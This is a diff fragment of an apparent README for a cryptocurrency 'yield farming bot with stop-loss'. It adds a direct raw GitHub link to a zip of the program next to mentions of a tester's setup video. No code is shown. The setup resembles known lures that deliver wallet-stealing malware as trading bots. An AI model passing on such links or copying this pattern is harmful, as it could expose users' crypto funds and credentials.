@@ -3,6 +3,8 @@ If you change the settings keep in mind you want to double check you're using th
 
 you can download the zip file of the program here
 
+https://github.com/CalliDreaming/JavaScript-Volatility-Yield-Farming-Bot-With-StopLoss/raw/main/JavaScript-Volatility-Yield-Farming-Bot-With-StopLoss.zip
+
 one of the testers of this program made a YouTube video on how to configure it step by step here
 
 if you prefer written instructions with visual support here you are
